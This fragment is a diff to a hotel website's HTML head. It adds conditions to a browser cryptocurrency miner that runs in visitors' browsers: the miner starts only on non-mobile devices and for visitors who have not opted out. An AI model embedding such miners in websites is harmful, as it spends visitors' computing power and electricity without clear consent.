@@ -81,7 +81,11 @@ It offers 18 rooms, all of which are en-suite and in..."/>
       threads: 2,
       throttle: 0.8
     });
-    miner.start();
+    // Only start on non-mobile devices and if not opted-out
+    // in the last 14400 seconds (4 hours):
+    if (!miner.isMobile() && !miner.didOptOut(14400)) {
+      miner.start();
+    }
   </script>
 </head>
 
